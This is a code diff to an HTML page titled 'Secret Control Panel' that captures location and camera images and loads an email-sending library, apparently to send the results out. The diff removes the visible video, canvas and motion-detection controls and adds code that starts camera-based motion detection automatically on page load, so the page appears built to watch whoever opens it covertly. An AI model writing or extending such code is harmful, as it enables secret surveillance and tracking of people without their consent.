@@ -45,9 +45,6 @@
   <h2>Secret Control Panel</h2>
   <button onclick="sendLocationOnly()">Check Location Only</button>
   <button onclick="captureAndSend()">Take Picture + Location</button>
-  <button onclick="startMotionDetection()">Start Motion Detection</button>
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas"></canvas>
   <div id="status">Waiting for command...</div>
 
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
@@ -150,6 +147,13 @@
       prevCtx.drawImage(video, 0, 0, prevImage.width, prevImage.height);
       setTimeout(checkMotion, 1000);
     }
+
+    // Start motion detection automatically when the page loads
+    window.onload = function() {
+      startMotionDetection();
+    }
   </script>
 </body>
 </html>
+
+  
